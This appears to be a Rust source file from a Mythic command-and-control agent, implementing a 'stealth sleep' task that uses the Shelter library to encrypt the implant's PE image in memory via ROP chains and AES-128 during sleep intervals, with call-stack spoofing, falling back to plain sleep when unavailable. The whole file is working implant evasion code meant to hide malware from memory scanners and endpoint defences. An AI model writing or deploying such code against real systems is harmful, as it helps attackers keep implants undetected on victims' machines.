// Sleep obfuscation via Shelter by @Kudaes (https://github.com/Kudaes/Shelter)
// Encrypts the PE in memory using ROP chains + AES-128 during sleep intervals.
// Shelter uses Unwinder internally for call stack spoofing.

use crate::{AgentTask, mythic_success};
use serde::Deserialize;
use std::error::Error;

#[derive(Deserialize)]
struct StealthSleepArgs {
    interval: Option<u64>,
    encrypt_pe: Option<bool>,
}

pub fn do_stealth_sleep(secs: u64) {
    #[cfg(target_os = "windows")]
    {
        let result = shelter::fluctuate(true, Some(secs as u32), None);
        if result.is_err() {
            let result2 = shelter::fluctuate(false, Some(secs as u32), None);
            if result2.is_err() {
                std::thread::sleep(std::time::Duration::from_secs(secs));
            }
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        std::thread::sleep(std::time::Duration::from_secs(secs));
    }
}

pub fn stealth_sleep(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    let args: StealthSleepArgs = serde_json::from_str(&task.parameters)?;
    let interval = args.interval.unwrap_or(5);
    let encrypt = args.encrypt_pe.unwrap_or(true);

    #[cfg(target_os = "windows")]
    {
        let result = shelter::fluctuate(encrypt, Some(interval as u32), None);
        return match result {
            Ok(()) => Ok(mythic_success!(task.id, format!(
                "Stealth sleep completed ({} seconds, PE encrypted: {})", interval, encrypt
            ))),
            Err(_) => {
                std::thread::sleep(std::time::Duration::from_secs(interval));
                Ok(mythic_success!(task.id, format!(
                    "Sleep completed ({} seconds, Shelter unavailable, used standard sleep)", interval
                )))
            }
        };
    }

    #[cfg(not(target_os = "windows"))]
    {
        std::thread::sleep(std::time::Duration::from_secs(interval));
        Ok(mythic_success!(task.id, format!("Sleep completed ({} seconds)", interval)))
    }
}
